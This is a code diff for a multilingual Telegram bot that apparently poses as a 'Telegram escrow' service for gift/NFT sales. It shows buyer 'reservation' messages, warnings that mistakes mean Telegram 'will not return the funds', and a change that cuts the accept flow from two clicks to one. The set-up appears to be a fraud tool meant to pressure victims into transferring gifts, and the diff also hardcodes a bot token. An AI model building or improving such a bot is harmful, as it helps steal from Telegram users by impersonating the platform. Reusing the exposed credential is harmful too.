@@ -16,7 +16,9 @@ logging.basicConfig(
 
 BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"
 OFFER_TTL = 6 * 3600  # 6 часов в секундах
-TIMER_TICK = 60  # обновление таймера раз в минуту
+TIMER_TICK = 60  # опрос раз в минуту
+TIMER_MIN_EDIT_GAP = 60  # редактировать сообщение не чаще раза в 60 сек
+RECENT_CLICK_GRACE = 10  # после клика не трогать 10 сек
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -56,7 +58,7 @@ T = {
             "⚠️ Следуйте инструкции внимательно.\n\n"
             "Если вы передадите другой подарок или ошибётесь при подтверждении, "
             "Telegram не вернёт средства и не зачислит оплату автоматически.\n\n"
-            "Если вы ознакомились, нажмите «Ок» и затем ещё раз «Принять»."
+            "Если вы ознакомились, нажмите «Ок»."
         ),
         "instr_title": "Покупатель зарезервировал",
         "instr_via": "через эскроу-систему Telegram.",
@@ -93,7 +95,7 @@ T = {
             "⚠️ Дотримуйтесь інструкції уважно.\n\n"
             "Якщо ви передасте інший подарунок або помилитесь при підтвердженні, "
             "Telegram не поверне кошти і не зарахує оплату автоматично.\n\n"
-            "Якщо ви ознайомились, натисніть «Ок» і потім ще раз «Прийняти»."
+            "Якщо ви ознайомились, натисніть «Ок»."
         ),
         "instr_title": "Покупець зарезервував",
         "instr_via": "через ескроу-систему Telegram.",
@@ -130,7 +132,7 @@ T = {
             "⚠️ Follow the instructions carefully.\n\n"
             "If you send the wrong gift or confirm by mistake, Telegram will not "
             "return the funds and will not credit the payment automatically.\n\n"
-            "If you understand, press «OK» and then «Accept» again."
+            "If you understand, press «OK»."
         ),
         "instr_title": "The buyer has reserved",
         "instr_via": "via Telegram escrow.",
@@ -167,7 +169,7 @@ T = {
             "⚠️ 请严格按照说明操作。\n\n"
             "如果您发送了错误的礼物或错误地确认，Telegram 将不会退还资金，"
             "也不会自动记入付款。\n\n"
-            "如果您已了解，请点击「确定」，然后再次点击「接受」。"
+            "如果您已了解，请点击「确定」。"
         ),
         "instr_title": "买家已预留",
         "instr_via": "通过 Telegram 托管系统。",
@@ -661,45 +663,37 @@ async def on_accept(cb: CallbackQuery):
         return
     lang = meta["lang"]
 
-    # уже в инструкции — просто тихо игнорим
+    # уже в инструкции — только показываем alert (без повторного edit)
     if meta["state"] == "INSTRUCTION":
-        await cb.answer()
-        return
-
-    # первый клик: показываем ТОЛЬКО модальный alert с предупреждением
-    if meta["state"] == "OFFER":
-        meta["state"] = "ALERT_SHOWN"
         await cb.answer(t(lang, "alert"), show_alert=True)
         return
 
-    # второй клик (после прочтения alert): разворачиваем инструкцию
-    if meta["state"] == "ALERT_SHOWN":
-        try:
-            await bot.edit_message_text(
-                chat_id=meta["chat_id"],
-                message_id=meta["msg_id"],
-                text=build_instruction(
-                    meta["amount"], meta["currency"],
-                    meta["gift_name"], meta["gift_num"],
-                    order_id, lang,
-                    meta["username"], meta["user_id"],
-                    meta["nft_url"], meta["expires_at"],
-                ),
-                reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
-                business_connection_id=meta["bcid"],
-                link_preview_options=LinkPreviewOptions(
-                    is_disabled=False,
-                    prefer_large_media=True,
-                    show_above_text=True,
-                ),
-            )
-            meta["state"] = "INSTRUCTION"
-        except TelegramBadRequest as e:
-            logging.error(f"accept->instruction edit: {e}")
-        await cb.answer()
-        return
+    # один клик: разворачиваем инструкцию + показываем модальный alert одновременно
+    try:
+        await bot.edit_message_text(
+            chat_id=meta["chat_id"],
+            message_id=meta["msg_id"],
+            text=build_instruction(
+                meta["amount"], meta["currency"],
+                meta["gift_name"], meta["gift_num"],
+                order_id, lang,
+                meta["username"], meta["user_id"],
+                meta["nft_url"], meta["expires_at"],
+            ),
+            reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
+            business_connection_id=meta["bcid"],
+            link_preview_options=LinkPreviewOptions(
+                is_disabled=False,
+                prefer_large_media=True,
+                show_above_text=True,
+            ),
+        )
+        meta["state"] = "INSTRUCTION"
+    except TelegramBadRequest as e:
+        logging.error(f"accept->instruction edit: {e}")
 
-    await cb.answer()
+    # модальный alert поверх развёрнутой инструкции
+    await cb.answer(t(lang, "alert"), show_alert=True)
 
 
 @dp.callback_query(F.data.startswith("confirm:"))
